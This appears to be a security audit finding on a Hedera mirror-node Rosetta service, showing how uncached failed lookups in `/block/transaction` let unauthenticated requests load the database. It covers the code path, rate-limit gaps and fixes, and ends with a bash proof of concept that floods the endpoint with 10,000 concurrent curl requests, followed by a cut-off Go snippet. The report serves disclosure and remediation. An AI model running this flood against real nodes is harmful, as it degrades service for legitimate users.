### Title
Unauthenticated DB Exhaustion via Uncached Negative Transaction Lookups in `/block/transaction`

### Summary
The `BlockTransaction()` handler issues two unconditional database queries per request — one to resolve the block and one to look up the transaction — with no application-level rate limiting and no negative-result caching. An unprivileged attacker can flood the endpoint with a valid block identifier and a random-but-hex-valid transaction hash, causing every request to hit the database and return `ErrTransactionNotFound`, degrading DB throughput for legitimate users.

### Finding Description

**Exact code path:**

`BlockTransaction()` in `rosetta/app/services/block_service.go` (lines 77–102):

```
block, err := s.FindByIdentifier(ctx, ...)   // DB query 1: record_file table
transaction, err := s.FindByHashInBlock(...)  // DB query 2: transaction table
```

`FindByHashInBlock()` in `rosetta/app/services/base_service.go` (line 51) delegates directly to `transactionRepository.FindByHashInBlock()` in `rosetta/app/persistence/transaction.go` (lines 188–199):

```go
if err = db.Raw(
    selectTransactionsByHashInTimestampRange,
    sql.Named("hash", transactionHash),
    sql.Named("start", consensusStart),
    sql.Named("end", consensusEnd),
).Find(&transactions).Error; err != nil { ... }

if len(transactions) == 0 {
    return nil, hErrors.ErrTransactionNotFound   // no cache write, no dedup
}
```

**Root cause — failed assumption:** The code assumes callers will only query for transactions that exist. There is no negative-result cache, no deduplication of identical in-flight queries, and no application-level rate limiter anywhere in the rosetta Go service.

**Why the `entityCache` does not help:** The LRU `entityCache` in `blockAPIService` (line 22) is only consulted inside `updateOperationAccountAlias()` (lines 104–129), which is never reached when `FindByHashInBlock()` returns `ErrTransactionNotFound` — the function returns at line 93–95 before `updateOperationAccountAlias()` is called.

**Why the Traefik middleware does not close the gap:**
- `main.go` (lines 217–219) applies only metrics, tracing, and CORS middleware — zero rate limiting at the application layer.
- The Helm chart (`charts/hedera-mirror-rosetta/values.yaml`, lines 149–166) defines a Traefik `rateLimit` of `average: 10` keyed on `requestHost` (not per-IP), and `inFlightReq: amount: 5` per IP. These are:
  - Infrastructure-optional (requires Kubernetes + Traefik; `global.middleware: false` at line 95 shows it can be globally disabled).
  - Bypassable by rotating source IPs or using multiple hostnames.
  - Permissive enough (10 req/s per host) that even a single attacker can sustain meaningful DB load.

### Impact Explanation
Each malicious request forces two synchronous DB round-trips against the mirror-node PostgreSQL instance. Because the transaction table is large and the query is parameterized by hash bytes and a timestamp range, each miss is a real index scan. Sustained flooding raises DB CPU and I/O, increasing query latency for all concurrent legitimate API users (`/block`, `/account/balance`, `/construction/*`). This is a griefing-class DoS with no economic cost to the attacker and no on-chain effect.

### Likelihood Explanation
The endpoint is publicly reachable with no authentication. The attacker only needs to know one valid block index/hash (trivially obtained from `/block` with `block_identifier: {index: 0}`). Any hex string of the correct length is a syntactically valid transaction hash — `hex.DecodeString` succeeds and the query proceeds. The attack is stateless, trivially scriptable, and repeatable indefinitely.

### Recommendation
1. **Application-level rate limiting:** Add a per-IP token-bucket middleware in the Go server (e.g., `golang.org/x/time/rate`) applied before the handler, independent of infrastructure.
2. **Negative-result cache:** Cache `(blockConsensusStart, blockConsensusEnd, transactionHash) → ErrTransactionNotFound` in a short-TTL in-memory cache (e.g., 5–10 s) to collapse repeated identical miss queries.
3. **Block-level result cache:** Cache the result of `FindByIdentifier` so the first DB query is also absorbed on repeated calls for the same block.
4. **Tighten Traefik defaults:** Change `sourceCriterion` for `rateLimit` from `requestHost` to `ipStrategy` and lower `average` to a value appropriate for the expected legitimate call rate.

### Proof of Concept

```bash
# Step 1: obtain a valid block identifier (unauthenticated)
BLOCK=$(curl -s -X POST http://<rosetta-host>/block \
  -H 'Content-Type: application/json' \
  -d '{"network_identifier":{"blockchain":"Hedera","network":"mainnet"},
       "block_identifier":{"index":1}}')

INDEX=$(echo $BLOCK | jq '.block.block_identifier.index')
HASH=$(echo $BLOCK  | jq -r '.block.block_identifier.hash')

# Step 2: flood /block/transaction with a valid block but random tx hashes
for i in $(seq 1 10000); do
  curl -s -X POST http://<rosetta-host>/block/transaction \
    -H 'Content-Type: application/json' \
    -d "{\"network_identifier\":{\"blockchain\":\"Hedera\",\"network\":\"mainnet\"},
         \"block_identifier\":{\"index\":$INDEX,\"hash\":\"$HASH\"},
         \"transaction_identifier\":{\"hash\":\"0x$(openssl rand -hex 48)\"}}" &
done
wait
# Each iteration causes two DB queries; DB CPU/IO rises proportionally.
# Legitimate /block and /account/balance calls experience increased latency.

func (s *blockAPIService) BlockTransaction(
	ctx context.Context,
	request *rTypes.BlockTransactionRequest,
) (*rTypes.BlockTransactionResponse, *rTypes.Error) {
	h := tools.SafeRemoveHexPrefix(request.BlockIdentifier.Hash)
	block, err := s.FindByIdentifier(ctx, request.BlockIdentifier.Index, h)
	if err != nil {
		return nil, err
	}

	transaction, err := s.FindByHashInBlock(
		ctx,
		request.TransactionIdentifier.Hash,
		block.ConsensusStartNanos,
		block.ConsensusEndNanos,
	)
	if err != nil {
		return nil, err
	}
